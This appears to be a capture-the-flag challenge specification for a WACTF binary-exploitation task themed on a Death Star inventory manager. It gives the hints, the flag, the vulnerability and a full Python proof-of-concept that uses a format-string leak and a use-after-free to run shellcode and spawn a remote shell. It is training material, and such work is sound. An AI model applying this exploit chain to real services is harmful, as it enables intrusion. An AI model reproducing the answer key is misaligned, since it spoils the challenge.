Challenge Data:

| metadata |  |
|--- | --- |
| Developer Name(s) | Luke |
| Best Contact Slack handle / Email address | Luke (WACTF Slack) / luke.healy@cybercx.com.au |
| Challenge Category | Exploit |
| Challenge Tier | 5 |
| Challenge Type | Container and file (deathstar_inventory_manager_v0.1_experimental_donotuse.elf) |

| Player facing |  |
|--- | --- |
|Challenge Name | Fully Armed and Operational Battle Station |
|Challenge Description | Rebel hackers have stolen secret DeathStart-ng plans. They've recovered a file named 'deathstar_inventory_manager_v0.1_experimental_donotuse.elf' which was found to be running on the new IOT enabled DeathStar-ng. The rebels recommend setting up a ubuntu:18.04 docker container for experimenting, also the production binary is being run like so: ncat -lk 1300 -e /binary ... whatever that means. Good luck, we're counting on you. | 
|Challenge Hint 1 | Probably a bunch of vulns in this, but there is definitely a UAF. |
|Challenge Hint 2 | Use the source Luke... https://github.com/LukeHealy/Deathstar-ng |

| Admin Facing | <> |
| --- | --- |
| Challenge Flag| WACTF{Computers were a mistake.} |
| Challenge Vuln| Use after free allows overwriting of function pointer and DEP is disabled. |
| Docker Usage Idle | 0% CPU / 2MB RAM |
| Docker Usage Expected Peak | 0.4% CPU / 2MB RAM |

Challenge PoC
~~~python
from __future__ import print_function
import socket
import time
import sys
import subprocess
from binascii import unhexlify
from binascii import hexlify

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 1300))

def convert_to_hex_endian(addr):
    addr_e = ""
    if len(addr) % 2 != 0:
        addr = "0" + addr
    for i in range(0, len(addr), 2):
        addr_e = (addr[i] + addr[i+1]) + addr_e
    
    return unhexlify(addr_e)

def send(msg):
    sock.sendall(msg + b"\n")
    time.sleep(0.1)
    received = sock.recv(1024)
    #print(received)
    return received

def parse_leaked_addr(reply):
    #print(reply)
    addr = reply.split("\n")[0]
    addr2 = addr.split("0x")[5]
    return addr2

print("Adding first ship.")
print("Performing format string attack on ship name field.")
send(b"1")
send(b"%p%p%p%p%p%p%p%p%p")
send(b"8")
send(b"2")
addr2 = parse_leaked_addr(send("0"))
print("Leaked address of the ship: 0x" + addr2)
print("Add 8 to it.")
addr2 = hex(int(addr2, 16) + 8)[2:]
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
call_addr = convert_to_hex_endian(addr2)
print("The leaked address is the one we want to call later: " + addr2)
print("Adding second ship")
send(b"1")
send(b"BBBB")
send(b"8")
print("Freeing the first ship.")
send(b"3")
send(b"0")
print("Performing use after free to write shellcode to first ship (now the banner).")
send(b"4")
send(b"\x90" * 8 + shellcode)
print("Freeing the second ship.")
send(b"3")
send(b"1")
print("Performing use after free to overwrite function pointer to point to first ship.")
send(b"4")
send(b"A" * 24 + call_addr)
print("Triggering call to function pointer of second ship.")
send(b"2")
sock.sendall(b"1\n")
print("Dropping into psuedo shell. (Don't run commands that have no output.)")

try:
    while True:
        cmd = raw_input("$ ")
        print(send(bytes(cmd)))
except:
    sock.close()
~~~
---
